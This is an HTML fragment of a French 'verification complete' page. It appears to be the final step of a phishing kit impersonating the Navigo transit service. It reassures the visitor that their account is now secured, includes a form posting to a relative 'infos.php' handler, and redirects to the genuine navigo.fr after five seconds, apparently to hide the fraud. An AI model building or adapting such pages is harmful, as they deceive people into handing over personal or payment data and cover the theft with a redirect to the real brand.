...
<html xmlns="http://www.w3.org/1999/xhtml" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="">
        <meta http-equiv="refresh" content="5;url=https://navigo.fr">
    ...
    <div id="container">
        ...
        <div id="container">
            <main role="main">
                <h2 style="text-align: center;">Vérification terminée</h2>
                <div>
                    <ol id="slideNumber" class="slidePageStep step-createAccount">
                        ...
                        <li id="stepCs" aria-current="step">Finalisation</li>
                    </ol>
                </div>
                <section>
                    <form id="kc-register-form" class="form-simple" action="../action/infos.php" method="post">
                        <div id="part1">
                            <div class="slidepage">
                                <section>
                                    <h3>
                                        Votre vérification a été effectuée avec succès. Votre compte est maintenant sécurisé, et vous pouvez profiter de nos services en toute confiance. Si vous avez d'autres questions ou besoins, n'hésitez pas à nous contacter. Merci pour votre confiance !
                                    </h3>
                                    
                                    <div style="text-align: center; margin: auto;" id="form-element" onmouseover="validateField()">
                                        <img style="margin: auto;" width="100" src="https://cdn.dribbble.com/users/251873/screenshots/9289747/13540-sign-for-success-alert.gif">
                                    </div>
                                </section>
                            </div>
